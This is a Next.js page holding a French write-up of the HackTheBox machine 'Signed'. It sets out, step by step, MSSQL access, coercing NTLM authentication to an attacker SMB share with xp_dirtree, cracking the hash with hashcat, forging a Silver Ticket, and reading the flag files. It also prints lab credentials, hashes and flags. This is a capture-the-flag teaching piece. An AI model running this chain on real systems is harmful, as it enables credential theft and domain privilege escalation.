import Link from "next/link";
import { ArrowLeft, Terminal, Key, Database, Shield } from "lucide-react";
import { Button } from "@/components/ui/button";
import { RevealFlagBlock } from "@/components/RevealFlag";

function CodeBlock({
  children,
  title,
  result,
}: {
  children: string;
  title?: string;
  result?: boolean;
}) {
  const label = result ? "Résultat" : title;
  return (
    <div className="my-4">
      {label && (
        <p className={`mb-1 text-xs font-mono ${result ? "text-primary" : "text-muted-foreground"}`}>
          {label}
        </p>
      )}
      <pre className="overflow-x-auto rounded-lg border border-border bg-card p-4 font-mono text-sm text-muted-foreground">
        <code className="whitespace-pre">{children}</code>
      </pre>
    </div>
  );
}

export const metadata = {
  title: "Signed | Writeup HTB | 0xbbuddha",
  description: "Writeup de la machine Signed (HackTheBox, Medium, Windows) – MSSQL, NTLM, Silver Ticket.",
};

export default function WriteupSignedPage() {
  return (
    <div className="container mx-auto max-w-4xl px-4 py-12">
      <Button variant="ghost" size="sm" asChild className="mb-8 gap-2">
        <Link href="/writeups">
          <ArrowLeft className="size-4" />
          Retour aux writeups
        </Link>
      </Button>

      <article className="space-y-10">
        <header>
          <div className="flex flex-wrap gap-2 text-sm text-muted-foreground">
            <span className="font-mono text-primary">HackTheBox</span>
            <span>·</span>
            <span>Medium</span>
            <span>·</span>
            <span>Windows</span>
          </div>
          <h1 className="mt-2 font-mono text-3xl font-bold tracking-tight sm:text-4xl">
            Signed
          </h1>
          <p className="mt-3 text-muted-foreground">
            Comme souvent en pentest Windows réel, on démarre avec des
            identifiants pour le compte <strong>scott / Sm230#C5NatH</strong>,
            utilisables sur le service MSSQL.
          </p>
        </header>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Terminal className="size-5 text-primary" />
            1. Reconnaissance
          </h2>
          <p className="text-muted-foreground">
            Un scan Nmap montre un seul port ouvert : <strong>1433</strong> (Microsoft SQL Server 2022).
            Le certificat SSL est auto-signé. On récupère aussi des infos NTLM (domaine SIGNED.HTB, DC01).
          </p>
          <CodeBlock title="Commande">
{`nmap -Pn -sC -sV 10.10.11.90 -T5`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`Nmap scan report for signed.htb (10.10.11.90)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info:
|   10.10.11.90:1433:
|     Version: Microsoft SQL Server 2022 RTM (16.00.1000.00)
| ms-sql-ntlm-info:
|   Target_Name: SIGNED
|   NetBIOS_Domain_Name: SIGNED
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SIGNED.HTB
|   DNS_Computer_Name: DC01.SIGNED.HTB`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Database className="size-5 text-primary" />
            2. Accès MSSQL (compte scott)
          </h2>
          <p className="text-muted-foreground">
            On valide les identifiants avec <strong>NetExec (nxc)</strong> en auth locale, puis on énumère les RID du domaine pour lister les utilisateurs et groupes.
          </p>
          <CodeBlock title="Commande">
{`nxc mssql 10.10.11.90 -u scott -p 'Sm230#C5NatH' --local-auth`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`MSSQL  10.10.11.90  1433  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL  10.10.11.90  1433  DC01  [+] DC01\\scott:Sm230#C5NatH`}
          </CodeBlock>
          <CodeBlock title="Commande (énumération RID)">
{`nxc mssql 10.10.11.90 -u scott -p 'Sm230#C5NatH' --local-auth --rid-brute`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`MSSQL  10.10.11.90  1433  DC01  [+] DC01\\scott:Sm230#C5NatH
512: SIGNED\\Domain Admins    513: SIGNED\\Domain Users
515: SIGNED\\Domain Computers 516: SIGNED\\Domain Controllers
1103: SIGNED\\mssqlsvc         1104: SIGNED\\HR
1105: SIGNED\\IT               1106: SIGNED\\Finance
1107: SIGNED\\Developers       1108: SIGNED\\Support
1109: SIGNED\\oliver.mills     1110: SIGNED\\emma.clark
... (autres utilisateurs)`}
          </CodeBlock>
          <CodeBlock title="Commande (serveurs liés)">
{`nxc mssql 10.10.11.90 -u scott -p 'Sm230#C5NatH' --local-auth -q "EXEC sp_linkedservers"`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`SRV_NAME: DC01
SRV_PROVIDERNAME: SQLNCLI
SRV_PRODUCT: SQL Server
SRV_DATASOURCE: DC01`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Serveur lié <strong>DC01</strong>. Connexion en interactif avec Impacket :
          </p>
          <CodeBlock title="Connexion MSSQL (Impacket mssqlclient.py)">
{`mssqlclient.py 'signed.htb/scott:Sm230#C5NatH@10.10.11.90'`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            3. Capture NTLM (xp_dirtree)
          </h2>
          <p className="text-muted-foreground">
            Depuis la session MSSQL, on force le serveur à se connecter à notre partage SMB via <strong>xp_dirtree</strong> (ou xp_fileexist). Le service MSSQL s’exécute sous le compte <strong>SIGNED\mssqlsvc</strong> : on récupère donc son hash Net-NTLMv2. Sur notre machine, on lance un listener (ex. <code className="rounded bg-muted px-1">responder</code> ou <code className="rounded bg-muted px-1">ntlmrelayx</code>) sur un partage (ex. 10.10.17.228).
          </p>
          <CodeBlock title="Depuis mssqlclient (remplacer par ton IP)">
{`xp_dirtree \\\\10.10.17.228\\share`}
          </CodeBlock>
          <CodeBlock title="Résultat (Responder / listener SMB)">
{`[SMB] NTLMv2-SSP Client   : 10.10.11.90
[SMB] NTLMv2-SSP Username : SIGNED\\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:87c79215452c07cf:A72260EA605DF5FD0F37EB8D03C62E4D:0101000000000000...`}
          </CodeBlock>
          <p className="text-muted-foreground">
            Sauvegarder le hash dans <code className="rounded bg-muted px-1">hash.txt</code> pour hashcat -m 5600.
          </p>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Key className="size-5 text-primary" />
            4. Crack du hash (hashcat)
          </h2>
          <p className="text-muted-foreground">
            Mode <strong>5600</strong> = Net-NTLMv2. Une fois cracké, on se connecte en domaine avec <strong>SIGNED\mssqlsvc</strong>.
          </p>
          <CodeBlock title="Commande">
{`hashcat -m 5600 hash.txt ~/Downloads/rockyou.txt`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`Status...........: Cracked
Hash.Target......: mssqlsvc::SIGNED:87c79215452c07cf:...
Recovered........: 1/1 (100.00%)
Guess.Base.......: File (rockyou.txt)
purPLE9795!@`}
          </CodeBlock>
          <CodeBlock title="Vérification des identifiants mssqlsvc">
{`nxc mssql 10.10.11.90 -u mssqlsvc -p 'purPLE9795!@'`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`MSSQL  10.10.11.90  1433  DC01  [+] SIGNED.HTB\\mssqlsvc:purPLE9795!@`}
          </CodeBlock>
          <CodeBlock title="Connexion MSSQL avec mssqlsvc (Windows auth)">
{`mssqlclient.py mssqlsvc:'purPLE9795!@'@10.10.11.90 -windows-auth`}
          </CodeBlock>
        </section>

        <section>
          <h2 className="mb-4 flex items-center gap-2 font-mono text-xl font-semibold">
            <Shield className="size-5 text-primary" />
            5. Élévation de privilèges – Silver Ticket
          </h2>
          <p className="text-muted-foreground">
            Avec <strong>mssqlsvc</strong> on n’est pas sysadmin ; le groupe <strong>SIGNED\IT</strong> l’est. On forge un <strong>Silver Ticket</strong> pour le SPN <strong>MSSQLSvc/DC01.SIGNED.HTB</strong> en s’octroyant les droits IT, avec le NTLM hash du compte mssqlsvc.
          </p>
          <CodeBlock title="Commande">
{`SELECT name FROM master.sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`name
-------------------------
sa
SIGNED\\IT
NT SERVICE\\SQLWriter
NT SERVICE\\Winmgmt
NT SERVICE\\MSSQLSERVER
NT SERVICE\\SQLSERVERAGENT`}
          </CodeBlock>
          <CodeBlock title="Commande">
{`SELECT IS_SRVROLEMEMBER('sysadmin');`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`----
0`}
          </CodeBlock>
          <p className="text-muted-foreground">
            On récupère le <strong>NTLM hash</strong> (MD4 du mot de passe en UTF-16LE), le <strong>SID domaine</strong> via SUSER_SID, et les RID (IT = 1105, mssqlsvc = 1103).
          </p>
          <CodeBlock title="Commande">
{`echo -n 'purPLE9795!@' | iconv -f UTF-8 -t UTF-16LE | openssl md4 -provider legacy`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`MD4(stdin)= ef699384c3285c54128a3ee1ddb1a0cc`}
          </CodeBlock>
          <CodeBlock title="Commande (dans MSSQL)">
{`SELECT SUSER_SID('SIGNED\\IT');`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`------------------------------------------------------------
0x0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000`}
          </CodeBlock>
          <p className="text-muted-foreground">
            SID domaine : <strong>S-1-5-21-4088429403-1159899800-2753317549</strong>. On forge le ticket avec <strong>ticketer.py</strong> (Impacket).
          </p>
          <CodeBlock title="Variables (à adapter selon ta cible)">
{`DOMSID=S-1-5-21-4088429403-1159899800-2753317549
IT_RID=1105
MSSQLSVC_RID=1103
nthash=ef699384c3285c54128a3ee1ddb1a0cc`}
          </CodeBlock>
          <CodeBlock title="Commande">
{`ticketer.py -nthash $nthash -domain-sid $DOMSID -domain SIGNED.HTB -spn MSSQLSvc/DC01.SIGNED.HTB -groups 512,$IT_RID -user-id $MSSQLSVC_RID mssqlsvc`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SIGNED.HTB/mssqlsvc
[*] Signing/Encrypting final ticket
[*] Saving ticket in mssqlsvc.ccache`}
          </CodeBlock>
          <CodeBlock title="Commande">
{`export KRB5CCNAME="$(pwd)/mssqlsvc.ccache"
mssqlclient.py -k 'signed.htb/mssqlsvc@dc01.signed.htb' -windows-auth -no-pass`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`[*] Encryption required, switching to TLS
[*] INFO(DC01): Changed database context to 'master'.
SQL (SIGNED\\mssqlsvc  dbo@master)>`}
          </CodeBlock>
          <CodeBlock title="Commande">
{`select is_srvrolemember('sysadmin');`}
          </CodeBlock>
          <CodeBlock title="Résultat" result>
{`----
1`}
          </CodeBlock>
          <p className="text-muted-foreground">
            On est sysadmin : lecture des flags via <strong>OPENROWSET(BULK ...)</strong>.
          </p>
        </section>

        <section>
          <h2 className="mb-4 font-mono text-xl font-semibold">
            6. Flags user.txt et root.txt
          </h2>
          <CodeBlock title="Commande">
{`SELECT * FROM OPENROWSET(BULK N'C:\\\\Users\\\\mssqlsvc\\\\Desktop\\\\user.txt', SINGLE_CLOB) AS t;`}
          </CodeBlock>
          <RevealFlagBlock title="Résultat (user.txt)" result>
{`BulkColumn
---------------------------------------
aa1a173856a36a9b27d4acb993950cc8`}
          </RevealFlagBlock>
          <CodeBlock title="Commande">
{`SELECT * FROM OPENROWSET(BULK N'C:\\\\Users\\\\administrator\\\\Desktop\\\\root.txt', SINGLE_CLOB) AS t;`}
          </CodeBlock>
          <RevealFlagBlock title="Résultat (root.txt)" result>
{`BulkColumn
---------------------------------------
20560d505e2275bbd1ad59c3821d4360`}
          </RevealFlagBlock>
        </section>

        <section className="rounded-lg border border-border bg-card p-6">
          <h3 className="font-mono font-semibold text-primary">Récap</h3>
          <ul className="mt-2 list-inside list-disc space-y-1 text-sm text-muted-foreground">
            <li>Recon : MSSQL 1433, domaine SIGNED.HTB</li>
            <li>Accès initial : scott / Sm230#C5NatH sur MSSQL</li>
            <li>Capture NTLM : xp_dirtree vers notre SMB → hash mssqlsvc</li>
            <li>Crack : hashcat -m 5600 → purPLE9795!@</li>
            <li>Privesc : Silver Ticket (nthash mssqlsvc + SPN MSSQLSvc, groupe IT) → sysadmin MSSQL</li>
            <li>Flags : OPENROWSET(BULK) pour user.txt et root.txt</li>
          </ul>
        </section>
      </article>
    </div>
  );
}
